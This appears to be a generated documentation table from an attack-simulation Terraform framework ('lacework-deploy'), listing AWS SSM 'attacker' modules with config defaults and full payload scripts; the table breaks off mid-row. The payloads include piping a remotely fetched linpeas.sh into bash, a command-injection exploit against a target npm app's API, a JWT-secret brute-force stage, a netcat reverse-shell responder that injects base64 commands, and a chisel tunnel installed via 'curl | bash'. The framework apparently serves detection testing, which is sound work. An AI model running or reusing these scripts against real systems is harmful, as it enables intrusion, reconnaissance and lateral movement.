                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-ssm-execute-generate-web-traffic-attacker                         | ./modules/ssm/execute-generate-web-traffic                     | ssm_exec_generate_web_traffic_attacker     | context.aws.ssm.attacker.execute.generate_web_traffic                     | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic                     | <pre>locals \{<br/>    attack\_dir = "/generate\-web\-traffic"<br/>    curl\_urls = join\("\\n", \[ for url in var\.inputs\["urls"\]: "curl \-s \-\-retry 20 \-\-retry\-connrefused \-\-retry\-delay 60 \-\-connect\-timeout 5 '$\{url\}'; log \\"curl $\{url\} result: $?\\"" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    log "Enumerating urls\.\.\."<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "Running url enumeration:\\n$\{local\.curl\_urls\}"<br/>        $\{local\.curl\_urls\}<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-ssm-execute-exploit-npm-app                                       | ./modules/ssm/execute-exploit-npm-app                          | ssm_exec_exploit_npm_app                   | context.aws.ssm.attacker.execute.exploit_npm_app                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_npm_app": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "target_ip": null,<br/>                            "target_port": 8089<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-npm-app                          | <pre>locals \{<br/>    attack\_dir = "/npm\_attack"<br/>    target\_ip=var\.inputs\["target\_ip"\]<br/>    target\_port=var\.inputs\["target\_port"\]<br/>    payload = <<\-EOT<br/>    log "cleaning app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script\.\.\."<br/>        log "payload: curl \-\-get \-\-verbose \\"http://$\{local\.target\_ip\}:$\{local\.target\_port\}/api/getServices\\" \-\-data\-urlencode 'name\[\]=\\$\($\{var\.inputs\["payload"\]\}\)'"<br/>        log "checking target: $\{local\.target\_ip\}:$\{local\.target\_port\}"<br/>        while \! nc \-z \-w 5 \-vv $\{local\.target\_ip\} $\{local\.target\_port\} > /dev/null; do<br/>            log "failed check \- waiting for target: $\{local\.target\_ip\}:$\{local\.target\_port\}";<br/>            sleep 30;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log "target available \- sending payload";<br/>        sleep 5;<br/>        curl \-\-get \-\-verbose "http://$\{local\.target\_ip\}:$\{local\.target\_port\}/api/getServices" \-\-data\-urlencode 'name\[\]=$\($\{var\.inputs\["payload"\]\}\)' >> $LOGFILE 2>&1;<br/>        echo "\\n" >> $LOGFILE<br/>        log "payload sent sleeping\.\.\."<br/>        log "done";<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| attacker-ssm-execute-exploit-authapp                                       | ./modules/ssm/execute-exploit-authapp                          | ssm_exec_exploit_authapp                   | context.aws.ssm.attacker.execute.exploit_authapp                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_authapp": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_user_first_name": null,<br/>                            "compromised_user_last_name": null,<br/>                            "enabled": false,<br/>                            "target_ip": null,<br/>                            "target_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-authapp                          | <pre>locals \{<br/>    exploit\_script = "bruteforce\_session\.py"<br/>    usernames\_script = "generate\_usernames\.py"<br/>    attack\_dir = "/authapp\_attack"<br/>    target\_ip=var\.inputs\["target\_ip"\]<br/>    target\_port=var\.inputs\["target\_port"\]<br/>    payload = <<\-EOT<br/>    log "cleaning app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    echo $\{base64gzip\(local\.exploit\)\} \| base64 \-d \| gunzip > $\{local\.exploit\_script\}<br/>    echo $\{base64gzip\(local\.usernames\)\} \| base64 \-d \| gunzip > $\{local\.usernames\_script\} <br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip > requirements\.txt<br/>    log "installing required python3\.9\.\.\."<br/>    apt\-get install \-y python3\.9 python3\.9\-venv >> $LOGFILE 2>&1<br/>    curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py >> $LOGFILE 2>&1<br/>    python3\.9 get\-pip\.py >> $LOGFILE 2>&1<br/>    log "wait before using module\.\.\."<br/>    sleep 5<br/>    python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc<br/>    log "installing exploit requirements\.\.\."<br/>    python3\.9 \-m pip install \-\-ignore\-installed \-r requirements\.txt<br/>    <br/>    curl \-LJ https://raw\.githubusercontent\.com/danielmiessler/SecLists/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Passwords/scraped\-JWT\-secrets\.txt \-o /tmp/scraped\-JWT\-secrets\.txt<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script\.\.\."<br/>        log "checking target: $\{local\.target\_ip\}:$\{local\.target\_port\}"<br/>        while \! nc \-z \-w 5 \-vv $\{local\.target\_ip\} $\{local\.target\_port\} > /dev/null; do<br/>            log "failed check \- waiting for target: $\{local\.target\_ip\}:$\{local\.target\_port\}";<br/>            sleep 30;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log "target available \- sending payload";<br/>        sleep 5;<br/>        <br/>        \# brute force the session password<br/>        python3\.9 $\{local\.exploit\_script\} \-\-host=$\{local\.target\_ip\} \-\-port=$\{local\.target\_port\} \-\-password\-list=/tmp/scraped\-JWT\-secrets\.txt \-\-output\-password\-list=/tmp/hydra\-passwords\.txt 2>&1 \| tee \-a $LOGFILE<br/><br/>        \# prep for second stage below providing usernames and password for lateral movement        <br/><br/>        \# result is hydra\-password list but we need a user list \- since external brute force isn't alerted on let's skip<br/>        \# python3\.9 $\{local\.usernames\_script\} \-\-first=$\{var\.inputs\["compromised\_user\_first\_name"\]\} \-\-last=$\{var\.inputs\["compromised\_user\_last\_name"\]\} \-\-output=/tmp/hydra\-users\.txt<br/>        USER\_NAME="$\(echo "$\{var\.inputs\["compromised\_user\_first\_name"\]\}" \| tr '\[:upper:\]' '\[:lower:\]' \| cut \-c1\)$\(echo "$\{var\.inputs\["compromised\_user\_last\_name"\]\}"\| tr '\[:upper:\]' '\[:lower:\]'\)"<br/>        log "username: $USER\_NAME"<br/>        echo $USER\_NAME > /tmp/hydra\-users\.txt<br/><br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/><br/>    exploit         = file\(<br/>                                "$\{path\.module\}/resources/bruteforce\_session\.py", <br/>                            \)<br/>    requirements    = file\(<br/>                                "$\{path\.module\}/resources/requirements\.txt", <br/>                            \)<br/>    usernames       = file\(<br/>                                "$\{path\.module\}/resources/generate\_usernames\.py", <br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}<br/><br/></pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-ssm-listener-http-listener                                        | ./modules/ssm/listener-http-listener                           | ssm_exec_responder_http_listener           | context.aws.ssm.attacker.listener.http                                    | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "listener": {<br/>                        "http": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 8080<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/listener-http-listener                           | <pre>locals \{<br/>    listen\_port = var\.inputs\["listen\_port"\]<br/>    listen\_ip = var\.inputs\["listen\_ip"\]<br/>    payload = <<\-EOT<br/>    mkdir \-p /tmp/www/<br/>    echo "index" > /tmp/www/index\.html<br/>    mkdir \-p /tmp/www/upload/v2<br/>    echo "upload" > /tmp/www/upload/v2/index\.html<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "listener: $\{local\.listen\_ip\}:$\{local\.listen\_port\}"<br/>        screen \-S http \-X quit<br/>        screen \-wipe<br/>        APPLOG=/tmp/http\_$SCRIPTNAME\.log<br/>        for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv "$APPLOG\."\{$i,$\(\(i\+1\)\)\} 2>/dev/null \|\| true; done<br/>        mv $APPLOG "$APPLOG\.1" 2>/dev/null \|\| true<br/>        screen \-d \-L \-Logfile /tmp/http\.log \-S http \-m python3 \-c "import base64; exec\(base64\.b64decode\('$\{base64encode\(local\.app\)\}'\)\)"<br/>        screen \-S http \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/><br/>    app = base64encode\(templatefile\(<br/>                "$\{path\.module\}/resources/app\.py\.tpl",<br/>                \{<br/>                    listen\_port = var\.inputs\["listen\_port"\]<br/>                \}\)\)<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-ssm-responder-port-forward                                        | ./modules/ssm/responder-port-forward                           | ssm_exec_responder_port_forward            | context.aws.ssm.attacker.responder.port_forward                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "port_forward": {<br/>                            "enabled": false,<br/>                            "listen_port": 8888<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-port-forward                           | <pre>locals \{<br/>    listen\_port = var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        killall \-9 chisel<br/>        truncate \-s 0 /tmp/chisel\.log<br/>        log "checking for chisel\.\.\."<br/>        while \! command \-v chisel; do<br/>            log "chisel not found \- installing"<br/>            curl https://i\.jpillora\.com/chisel\! \| bash<br/>            sleep 10<br/>        done<br/>        log "chisel: $\(command \-v  chisel\)"<br/>        /usr/local/bin/chisel server \-v \-p $\{local\.listen\_port\} > /tmp/chisel\.log 2>&1 &<br/>        log "responder started\.\.\."<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-ssm-responder-reverse-shell                                       | ./modules/ssm/responder-reverse-shell                          | ssm_exec_responder_reverse_shell           | context.aws.ssm.attacker.responder.reverse_shell                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell                          | <pre>locals \{<br/>    listen\_port = var\.inputs\["listen\_port"\]<br/>    listen\_ip = var\.inputs\["listen\_ip"\]<br/>    base64\_command\_payload = base64encode\(var\.inputs\["payload"\]\)<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        screen \-S netcat \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/netcat\.log<br/>        screen \-d \-L \-Logfile /tmp/netcat\.log \-S netcat \-m nc \-vv \-nl $\{local\.listen\_ip\} $\{local\.listen\_port\}<br/>        screen \-S netcat \-X colon "logfile flush 0^M"<br/>        log "listener started\.\."<br/>        until tail /tmp/netcat\.log \| grep \-m 1 "Connection received"; do<br/>            log "waiting for connection\.\.\.";<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log 'sending screen command: $\{var\.inputs\["payload"\]\}';<br/>        screen \-S netcat \-p 0 \-X stuff "echo '$\{local\.base64\_command\_payload\}' \| base64 \-d \| /bin/bash \-^M"<br/>        log "responder started\.\.\."<br/>        log 'waiting 10 minutes\.\.\.';<br/>        sleep 600<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    